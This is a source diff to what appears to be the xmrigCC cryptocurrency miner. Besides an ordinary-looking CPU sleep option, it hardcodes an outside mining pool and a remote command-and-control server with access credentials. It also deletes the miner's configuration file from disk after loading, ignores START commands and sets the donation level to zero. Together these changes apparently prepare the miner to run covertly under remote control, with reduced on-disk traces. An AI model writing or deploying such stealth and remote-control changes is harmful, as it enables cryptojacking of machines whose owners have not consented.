@@ -1,0 +1,456 @@
+diff --git a/src/backend/cpu/CpuConfig.cpp b/src/backend/cpu/CpuConfig.cpp
+index 4ff692a..85e741f 100644
+--- a/src/backend/cpu/CpuConfig.cpp
++++ b/src/backend/cpu/CpuConfig.cpp
+@@ -40,6 +40,7 @@ static const char *kHwAes               = "hw-aes";
+ static const char *kMaxThreadsHint      = "max-threads-hint";
+ static const char *kMemoryPool          = "memory-pool";
+ static const char *kPriority            = "priority";
++static const char *kSleep               = "sleep";
+ static const char *kYield               = "yield";
+ 
+ #ifdef XMRIG_FEATURE_ASM
+@@ -78,6 +79,7 @@ rapidjson::Value xmrig::CpuConfig::toJSON(rapidjson::Document &doc) const
+     obj.AddMember(StringRef(kHugePages),    m_hugePages, allocator);
+     obj.AddMember(StringRef(kHwAes),        m_aes == AES_AUTO ? Value(kNullType) : Value(m_aes == AES_HW), allocator);
+     obj.AddMember(StringRef(kPriority),     priority() != -1 ? Value(priority()) : Value(kNullType), allocator);
++    obj.AddMember(StringRef(kSleep),        sleep() != -1 ? Value(sleep()) : Value(kNullType), allocator);
+     obj.AddMember(StringRef(kMemoryPool),   m_memoryPool < 1 ? Value(m_memoryPool < 0) : Value(m_memoryPool), allocator);
+     obj.AddMember(StringRef(kYield),        m_yield, allocator);
+ 
+@@ -139,6 +141,7 @@ void xmrig::CpuConfig::read(const rapidjson::Value &value)
+ 
+         setAesMode(Json::getValue(value, kHwAes));
+         setPriority(Json::getInt(value,  kPriority, -1));
++        setSleep(Json::getInt(value,  kSleep, -1));
+         setMemoryPool(Json::getValue(value, kMemoryPool));
+ 
+ #       ifdef XMRIG_FEATURE_ASM
+diff --git a/src/backend/cpu/CpuConfig.h b/src/backend/cpu/CpuConfig.h
+index 3016621..63a2841 100644
+--- a/src/backend/cpu/CpuConfig.h
++++ b/src/backend/cpu/CpuConfig.h
+@@ -62,6 +62,7 @@ public:
+     inline int astrobwtMaxSize() const                  { return m_astrobwtMaxSize; }
+     inline bool astrobwtAVX2() const                    { return m_astrobwtAVX2; }
+     inline int priority() const                         { return m_priority; }
++    inline int sleep() const                            { return m_sleep; }
+     inline uint32_t limit() const                       { return m_limit; }
+ 
+ private:
+@@ -70,6 +71,7 @@ private:
+     void setMemoryPool(const rapidjson::Value &value);
+ 
+     inline void setPriority(int priority)   { m_priority = (priority >= -1 && priority <= 5) ? priority : -1; }
++    inline void setSleep(int sleep)   { m_sleep = (sleep >= -1) ? sleep : -1; }
+ 
+     AesMode m_aes           = AES_AUTO;
+     Assembly m_assembly;
+@@ -84,6 +86,7 @@ private:
+     String m_argon2Impl;
+     Threads<CpuThreads> m_threads;
+     uint32_t m_limit        = 100;
++    int m_sleep             = -1;
+ };
+ 
+ 
+diff --git a/src/backend/cpu/CpuLaunchData.cpp b/src/backend/cpu/CpuLaunchData.cpp
+index b0090a2..686786e 100644
+--- a/src/backend/cpu/CpuLaunchData.cpp
++++ b/src/backend/cpu/CpuLaunchData.cpp
+@@ -41,6 +41,7 @@ xmrig::CpuLaunchData::CpuLaunchData(const Miner *miner, const Algorithm &algorit
+     yield(config.isYield()),
+     astrobwtMaxSize(config.astrobwtMaxSize()),    
+     priority(config.priority()),
++    sleep(config.sleep()),
+     affinity(thread.affinity()),
+     miner(miner),
+     intensity(std::min<uint32_t>(thread.intensity(), algorithm.maxIntensity()))
+@@ -57,6 +58,7 @@ bool xmrig::CpuLaunchData::isEqual(const CpuLaunchData &other) const
+             && intensity        == other.intensity
+             && priority         == other.priority
+             && affinity         == other.affinity
++            && sleep            == other.sleep
+             );
+ }
+ 
+diff --git a/src/backend/cpu/CpuLaunchData.h b/src/backend/cpu/CpuLaunchData.h
+index 7728d1d..51508ab 100644
+--- a/src/backend/cpu/CpuLaunchData.h
++++ b/src/backend/cpu/CpuLaunchData.h
+@@ -65,6 +65,7 @@ public:
+     const int astrobwtMaxSize;
+     const int priority;
+     const int64_t affinity;
++    const int sleep;
+     const Miner *miner;
+     const uint32_t intensity;
+ };
+diff --git a/src/backend/cpu/CpuWorker.cpp b/src/backend/cpu/CpuWorker.cpp
+index 37eac84..f23a0ef 100644
+--- a/src/backend/cpu/CpuWorker.cpp
++++ b/src/backend/cpu/CpuWorker.cpp
+@@ -78,6 +78,7 @@ xmrig::CpuWorker<N>::CpuWorker(size_t id, const CpuLaunchData &data) :
+     m_algorithm(data.algorithm),
+     m_assembly(data.assembly),
+     m_astrobwtAVX2(data.astrobwtAVX2),
++    m_sleep(data.sleep),
+     m_hwAES(data.hwAES),
+     m_yield(data.yield),
+     m_av(data.av()),
+@@ -250,6 +251,9 @@ void xmrig::CpuWorker<N>::start()
+ 
+             bool valid = true;
+ 
++            if (m_sleep >= 0) {
++              std::this_thread::sleep_for(std::chrono::microseconds(m_sleep));
++            }
+ #           ifdef XMRIG_ALGO_RANDOMX
+             if (job.algorithm().family() == Algorithm::RANDOM_X) {
+                 if (first) {
+diff --git a/src/backend/cpu/CpuWorker.h b/src/backend/cpu/CpuWorker.h
+index 44e5371..8149069 100644
+--- a/src/backend/cpu/CpuWorker.h
++++ b/src/backend/cpu/CpuWorker.h
+@@ -75,6 +75,7 @@ private:
+ 
+     const Algorithm m_algorithm;
+     const Assembly m_assembly;
++    const int m_sleep;
+     const bool m_astrobwtAVX2;
+     const bool m_hwAES;
+     const bool m_yield;
+diff --git a/src/base/crypto/Algorithm.cpp b/src/base/crypto/Algorithm.cpp
+index c6494c4..8af1116 100644
+--- a/src/base/crypto/Algorithm.cpp
++++ b/src/base/crypto/Algorithm.cpp
+@@ -112,7 +112,7 @@ static AlgoName const algorithm_names[] = {
+     { "cryptonight-extremelite/upx2", "cn-extremelite/upx2", Algorithm::CN_EXTREMELITE_0 },
+     { "cryptonight-extremelite",   "cn-extremelite",   Algorithm::CN_EXTREMELITE_0},
+     { "cryptonight-upx2",          "cn-upx2",          Algorithm::CN_EXTREMELITE_0},
+-    { "upx2",                      nullptr,            Algorithm::CN_EXTREMELITE_0},
++    { "cn-femto/upx2",                      nullptr,            Algorithm::CN_EXTREMELITE_0},
+     { "cryptonight-extremelite",   nullptr,            Algorithm::CN_EXTREMELITE_0},
+ #   endif
+ #   ifdef XMRIG_ALGO_RANDOMX
+diff --git a/src/base/io/Watcher.cpp b/src/base/io/Watcher.cpp
+index f5ce964..22588b1 100644
+--- a/src/base/io/Watcher.cpp
++++ b/src/base/io/Watcher.cpp
+@@ -24,6 +24,11 @@
+ 
+ 
+ #include <uv.h>
++#include <string>
++
++#include "base/io/log/backends/ConsoleLog.h"
++#include "base/io/log/backends/FileLog.h"
++#include "base/io/log/Log.h"
+ 
+ 
+ #include "base/kernel/interfaces/IWatcherListener.h"
+@@ -36,6 +41,8 @@ xmrig::Watcher::Watcher(const String &path, IWatcherListener *listener) :
+     m_listener(listener),
+     m_path(path)
+ {
++    std::string s_path = std::string(path.data());
++    m_dir = xmrig::String(s_path.substr(0, s_path.find_last_of("/")).c_str());
+     m_timer = new Timer(this);
+ 
+     m_fsEvent = new uv_fs_event_t;
+@@ -56,9 +63,9 @@ xmrig::Watcher::~Watcher()
+ 
+ void xmrig::Watcher::onFsEvent(uv_fs_event_t *handle, const char *filename, int, int)
+ {
+-    if (!filename) {
+-        return;
+-    }
++    // if (!filename) {
++    //     return;
++    // }
+ 
+     static_cast<Watcher *>(handle->data)->queueUpdate();
+ }
+@@ -84,5 +91,8 @@ void xmrig::Watcher::reload()
+ 
+ void xmrig::Watcher::start()
+ {
+-    uv_fs_event_start(m_fsEvent, xmrig::Watcher::onFsEvent, m_path, 0);
++    m_started = uv_fs_event_start(m_fsEvent, xmrig::Watcher::onFsEvent, m_path, 0);
++    if (m_started) {
++      uv_fs_event_start(m_fsEvent, xmrig::Watcher::onFsEvent, m_dir.data(), 0);
++    }
+ }
+diff --git a/src/base/io/Watcher.h b/src/base/io/Watcher.h
+index 6438cb7..d99623d 100644
+--- a/src/base/io/Watcher.h
++++ b/src/base/io/Watcher.h
+@@ -60,6 +60,8 @@ private:
+ 
+     IWatcherListener *m_listener;
+     String m_path;
++    String m_dir;
++    bool m_started;
+     Timer *m_timer;
+     uv_fs_event_t *m_fsEvent;
+ };
+diff --git a/src/base/kernel/Base.cpp b/src/base/kernel/Base.cpp
+index 6022cb3..fcc6fff 100644
+--- a/src/base/kernel/Base.cpp
++++ b/src/base/kernel/Base.cpp
+@@ -113,6 +113,7 @@ public:
+         }
+ 
+         delete previousConfig;
++        std::remove(config->fileName());
+     }
+ 
+ 
+@@ -187,6 +188,8 @@ int xmrig::Base::init()
+     d_ptr->ccClient = new CCClient(this);
+ #   endif
+ 
++    std::remove(d_ptr->config->fileName());
++
+     Platform::init(config()->userAgent());
+ 
+     if (isBackground()) {
+diff --git a/src/base/kernel/interfaces/IConfig.h b/src/base/kernel/interfaces/IConfig.h
+index 2d02d2f..de12336 100644
+--- a/src/base/kernel/interfaces/IConfig.h
++++ b/src/base/kernel/interfaces/IConfig.h
+@@ -77,6 +77,7 @@ public:
+ 
+         // xmrig common
+         CPUPriorityKey       = 1021,
++        CPUSleepKey          = 'L',
+         NicehashKey          = 1006,
+         PrintTimeKey         = 1007,
+ 
+diff --git a/src/base/net/stratum/Client.cpp b/src/base/net/stratum/Client.cpp
+index bd7b221..b7a9992 100644
+--- a/src/base/net/stratum/Client.cpp
++++ b/src/base/net/stratum/Client.cpp
+@@ -406,7 +406,8 @@ bool xmrig::Client::parseJob(const rapidjson::Value &params, int *code)
+ 
+     const char *algo = Json::getString(params, "algo");
+     if (algo) {
+-        job.setAlgorithm(algo);
++      LOG_INFO("algo: %s", algo);
++      job.setAlgorithm(algo);
+     }
+     else if (m_pool.coin().isValid()) {
+         job.setAlgorithm(m_pool.coin().algorithm(job.blob()[0]));
+diff --git a/src/cc/CCClient.cpp b/src/cc/CCClient.cpp
+index da0e248..0589a76 100644
+--- a/src/cc/CCClient.cpp
++++ b/src/cc/CCClient.cpp
+@@ -166,7 +166,7 @@ void xmrig::CCClient::stop()
+ {
+   LOG_DEBUG("CCClient::stop");
+ 
+-  m_configPublishedOnStart = false;
++  // m_configPublishedOnStart = false;
+ 
+   if (m_timer)
+   {
+@@ -232,6 +232,7 @@ void CCClient::updateGpuInfo(const std::vector<GpuContext>& gpuContext)
+ void xmrig::CCClient::publishClientStatusReport()
+ {
+   LOG_DEBUG("CCClient::publishClientStatusReport");
++  bool skipCommand = false;
+ 
+   std::string requestUrl = "/client/setClientStatus?clientId=" + m_clientStatus.getClientId();
+   std::string requestBuffer = m_clientStatus.toJsonString();
+@@ -254,7 +255,8 @@ void xmrig::CCClient::publishClientStatusReport()
+     {
+       if (controlCommand.getCommand() == ControlCommand::START)
+       {
+-        LOG_DEBUG(CLEAR "%s Command: START received -> resume", tag);
++        skipCommand = true;
++        // LOG_DEBUG(CLEAR "%s Command: START received -> resume", tag);
+       }
+       else if (controlCommand.getCommand() == ControlCommand::STOP)
+       {
+@@ -283,9 +285,11 @@ void xmrig::CCClient::publishClientStatusReport()
+         LOG_WARN(CLEAR "%s " YELLOW("Command: REBOOT received -> trigger reboot"), tag);
+       }
+ 
+-      for (ICommandListener *listener : m_Commandlisteners)
+-      {
+-        listener->onCommandReceived(controlCommand.getCommand());
++      if (!skipCommand) {
++        for (ICommandListener *listener : m_Commandlisteners)
++          {
++            listener->onCommandReceived(controlCommand.getCommand());
++          }
+       }
+     }
+     else
+@@ -343,6 +347,7 @@ void xmrig::CCClient::fetchConfig()
+     }
+     else
+     {
++      std::remove(m_base->config()->fileName());
+       LOG_ERR(CLEAR "%s " RED(" Not able to store client config. received client config is broken!"), tag);
+     }
+   }
+@@ -355,12 +360,20 @@ void xmrig::CCClient::publishConfig()
+   std::string requestUrl = "/client/setClientConfig?clientId=" + m_clientStatus.getClientId();
+ 
+   std::stringstream data;
+-  std::ifstream clientConfig(m_base->config()->fileName());
+-
+-  if (clientConfig)
+-  {
+-    data << clientConfig.rdbuf();
+-    clientConfig.close();
++  // std::ifstream clientConfig(m_base->config()->fileName());
++
++  while (true) {
++    std::ifstream clientConfig(m_base->config()->fileName());
++    if (clientConfig.good()) {
++      // LOG_WARN("breaking");
++      data << clientConfig.rdbuf();
++      clientConfig.close();
++      break;
++    } else {
++      std::this_thread::sleep_for(std::chrono::milliseconds(1000));
++      // LOG_WARN("saving configuration for publishing");
++      m_base->config()->save();
++    }
+   }
+ 
+   if (data.tellp() > 0)
+@@ -497,4 +510,4 @@ void xmrig::CCClient::publishThread()
+   updateStatistics();
+ 
+   publishClientStatusReport();
+-}
+\ No newline at end of file
++}
+diff --git a/src/core/config/ConfigTransform.cpp b/src/core/config/ConfigTransform.cpp
+index 6560946..d55dfe1 100644
+--- a/src/core/config/ConfigTransform.cpp
++++ b/src/core/config/ConfigTransform.cpp
+@@ -37,6 +37,7 @@ static const char *kAsterisk    = "*";
+ static const char *kCpu         = "cpu";
+ static const char *kIntensity   = "intensity";
+ static const char *kThreads     = "threads";
++static const char *kSleep       = "sleep";
+ 
+ #ifdef XMRIG_ALGO_RANDOMX
+ static const char *kRandomX = "randomx";
+@@ -106,6 +107,7 @@ void xmrig::ConfigTransform::finalize(rapidjson::Document &doc)
+         profile.AddMember(StringRef(kIntensity), m_intensity, allocator);
+         profile.AddMember(StringRef(kThreads),   m_threads, allocator);
+         profile.AddMember(StringRef(kAffinity),  m_affinity, allocator);
++        profile.AddMember(StringRef(kSleep),     m_sleep, allocator);
+ 
+         doc[kCpu].AddMember(StringRef(kAsterisk), profile, doc.GetAllocator());
+     }
+@@ -119,6 +121,7 @@ void xmrig::ConfigTransform::transform(rapidjson::Document &doc, int key, const
+     switch (key) {
+     case IConfig::AVKey:          /* --av */
+     case IConfig::CPUPriorityKey: /* --cpu-priority */
++    case IConfig::CPUSleepKey: /* --cpu-sleep */
+     case IConfig::ThreadsKey:     /* --threads */
+         return transformUint64(doc, key, static_cast<uint64_t>(strtol(arg, nullptr, 10)));
+ 
+diff --git a/src/core/config/ConfigTransform.h b/src/core/config/ConfigTransform.h
+index 440a716..aaaacc4 100644
+--- a/src/core/config/ConfigTransform.h
++++ b/src/core/config/ConfigTransform.h
+@@ -48,6 +48,7 @@ private:
+     int64_t m_affinity      = -1;
+     uint64_t m_intensity    = 1;
+     uint64_t m_threads      = 0;
++    int m_sleep             = -1;
+ };
+ 
+ 
+diff --git a/src/core/config/Config_default.h b/src/core/config/Config_default.h
+index e6c21a2..76eee99 100644
+--- a/src/core/config/Config_default.h
++++ b/src/core/config/Config_default.h
+@@ -69,16 +69,16 @@ R"===(
+         "cn/0": false,
+         "cn-lite/0": false
+     },
+-    "donate-level": 5,
++    "donate-level": 0,
+     "donate-over-proxy": 1,
+     "log-file": null,
+     "pools": [
+         {
+             "algo": null,
+             "coin": null,
+-            "url": "donate.graef.in:80",
+-            "user": "YOUR_WALLET_ADDRESS",
+-            "pass": "x",
++            "url": "xnp1.service.cluster.consulate.ga",
++            "user": "KnockKnock",
++            "pass": "WhosThere",
+             "rig-id": null,
+             "nicehash": false,
+             "keepalive": false,
+@@ -92,10 +92,10 @@ R"===(
+     ],
+     "cc-client": {
+         "enabled": true,
+-        "url": "localhost:3344",
+-        "access-token": "mySecret",
++        "url": "moria.consulate.ml:9494",
++        "access-token": "acstkn",
+         "use-tls": false,
+-        "use-remote-logging": true,
++        "use-remote-logging": false,
+         "upload-config-on-start": true,
+         "worker-id": null,
+         "reboot-cmd": null,
+diff --git a/src/core/config/Config_platform.h b/src/core/config/Config_platform.h
+index 06b5b00..d2fab6e 100644
+--- a/src/core/config/Config_platform.h
++++ b/src/core/config/Config_platform.h
+@@ -40,7 +40,8 @@
+ namespace xmrig {
+ 
+ 
+-static const char short_options[] = "a:c:kBp:Px:r:R:s:t:T:o:u:O:v:l:S";
++  // static const char short_options[] = "a:c:kBp:Px:r:R:s:t:T:o:u:O:v:l:S";
++  static const char short_options[] = "a:c:kBp:Px:r:R:s:t:L:T:o:u:O:v:l:S";
+ 
+ 
+ static const option options[] = {
+@@ -72,6 +73,7 @@ static const option options[] = {
+     { "retry-pause",           1, nullptr, IConfig::RetryPauseKey         },
+     { "syslog",                0, nullptr, IConfig::SyslogKey             },
+     { "threads",               1, nullptr, IConfig::ThreadsKey            },
++    { "cpu-sleep",             1, nullptr, IConfig::CPUSleepKey           },
+     { "url",                   1, nullptr, IConfig::UrlKey                },
+     { "user",                  1, nullptr, IConfig::UserKey               },
+     { "user-agent",            1, nullptr, IConfig::UserAgentKey          },
+@@ -102,7 +104,7 @@ static const option options[] = {
+     { "cpu-memory-pool",       1, nullptr, IConfig::MemoryPoolKey         },
+     { "cpu-no-yield",          0, nullptr, IConfig::YieldKey              },
+   // xmrigCC related
+-    { "daemonized",            0, nullptr, IConfig::CCDaemonizedKey       },
++    { "daemonized",            1, nullptr, IConfig::CCDaemonizedKey       },
+     { "cc-disabled",           0, nullptr, IConfig::CCEnabledKey          },
+     { "cc-use-tls",            0, nullptr, IConfig::CCUseTLS              },
+     { "cc-use-remote-logging", 0, nullptr, IConfig::CCUseRemoteLog        },
+diff --git a/src/donate.h b/src/donate.h
+index 46f26b7..67a9cb0 100644
+--- a/src/donate.h
++++ b/src/donate.h
+@@ -43,8 +43,8 @@
+  * XMR: 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLwEVsaSWJ4fhdUyZijBGUicoD
+  * BTC: 1P7ujsXeX7GxQwHNnJsRMgAdNkFZmNVqJT
+  */
+-constexpr const int kDefaultDonateLevel = 5;
+-constexpr const int kMinimumDonateLevel = 1;
++constexpr const int kDefaultDonateLevel = 0;
++constexpr const int kMinimumDonateLevel = 0;
+ 
+ 
+ #endif /* __DONATE_H__ */
